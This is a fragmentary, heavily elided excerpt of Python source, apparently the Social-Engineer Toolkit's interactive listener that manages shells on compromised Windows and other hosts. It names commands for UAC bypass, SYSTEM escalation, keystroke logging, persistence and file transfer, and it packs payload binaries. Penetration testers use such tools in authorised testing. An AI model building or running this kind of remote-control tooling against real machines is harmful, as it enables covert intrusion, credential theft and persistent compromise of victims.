...
# load core modules if its available
core_modules = False
if os.path.isfile("src/core/core.py"):
	sys.path.append("src/core/")
	import core
	core_modules = True
	print "[*] Loaded SET core modules into SET Interactive Listener..."
...
# handle index error
	...
	PORT = raw_input("Enter the port to listen on (enter for default): ")
	if PORT == "": 
	...
	try:
		...
		while 1:
			PORT = raw_input("[!] Needs to be a port number. Enter the port to listen on: ")
			if PORT == "": 
				PORT = 443
				break
			try:
...
# set a flag that uac is off
uac_safe = ""

# set the global quit flag
global_quit = ""

# set a flag that system is off
bypass_system = ""
...
try:
	...
	print "[*] Crypto.Cipher library is installed. AES will be used for socket communication."
	print "[*] All communications will leverage AES 256 and randomized cipher-key exchange."
...
# if it isn't import then trigger error and turn off encryption
	...
	encryption = 0
	print "[!] Crypto.Cipher python module not detected. Disabling encryption."
	print "[!] If you want encrypted communications download from here: http://ftp.dlitz.net/pub/dlitz/crypto/pycrypto/pycrypto-2.3.tar.gz"
	print "[!] Or if your on Ubuntu head over to: http://packages.ubuntu.com/search?keywords=python-crypto"
	print "[!] Or you can simply type apt-get install python-crypto or in Back|Track apt-get install python2.5-crypto"
...
def send_packet(message,conn,encryption):
	...
	# handle exceptions
		...
		print "[!] An exception occured. Handling it and keeping session alive. Error: " + str(e)
		pass
...
class Completer:
	def __init__(self):
		if operating_system == "windows":
			self.words = ["shell","localadmin", "help", "?", "domainadmin", "ssh_tunnel", "bypassuac", "lockworkstation", "grabsystem", "download", "upload", "ps", "kill", "keystroke_start", "keystroke_dump", "reboot", "persistence", "removepersistence", "cls", "clear"]
...
def handle_connection(conn,addr,encryption,operating_system):
    ...
    print "[*] Dropping into the Social-Engineer Toolkit Interactive Shell."
    ...
    try:
	    ...
	    if encryption == 1:
				...
				# pub/private randomly generated keys.
	...
	print "[!] Looks like the session died. Dropping back into selection menu."
	...
	garbage2 = ""
	garbage3 = ""
	thread.start_new_thread(call_connections,(dict,garbage1,garbage2,garbage3))
	sys.exit()
    ...
    try:
		...
		while 1:
			...
			if data == "quit" or data == "exit" or data == "back":
				print "[*] Dropping back to list of victims."
...
"""
			...
			if data == "shell":
				...
				while 1:
					try:
						# accept raw input
						data=raw_input("set/command_shell>")
			...
			if data == "grabsystem":
				...
				time.sleep(0.5)
                                ...
                                bypass_system = [addr, "bypass_system"]
				...
				try:
					...
					if os.path.isfile("src/payloads/set_payloads/persistence.binary"):
						if core_modules == True:
							...
							core.upx("src/program_junk/persistence.binary")
					...
					if os.path.isfile("src/payloads/set_payloads/shell.windows"):
	                                        if core_modules == True:
	                                                ...
	                                                core.upx("src/program_junk/shell.windows")
...
print "The Social-Engineer Toolkit (SET) is listening on: 0.0.0.0:" + str(PORT)
...
def call_connections(dict,garbage1,garbage2,garbage3):
				global count
				count = 2
				counter = 1
   ...
   while 1:
	...
	if addr[0] != "127.0.0.1":
		...
		if data == "IHAYYYYYIAMSETANDIAMWINDOWS":
			...
			if bypass_system != "":
				if addr[0] == bypass_system[0]:
					temp_addr = str(addr[0] + ":WINDOWS:SYSTEM")
					bypass_counter = 1
			if uac_safe != "":
				if addr[0] == uac_safe[0]:
	...
	try:
		...
		if count == 1:
				#call_connections(dict)
					# call our main caller handler
					garbage1 = ""
					garbage2 = ""
					garbage3 = ""
					thread.start_new_thread(call_connections,(dict,garbage1,garbage2,garbage3))
	except KeyboardInterrupt: # except keyboardinterrupts
		exit_menu()
		sys.exit()
...
# handle keyboardinterrupts
	...
	# trigger exit menu depending on which loop your in
	exit_menu()
	# exit the system
	sys.exit()
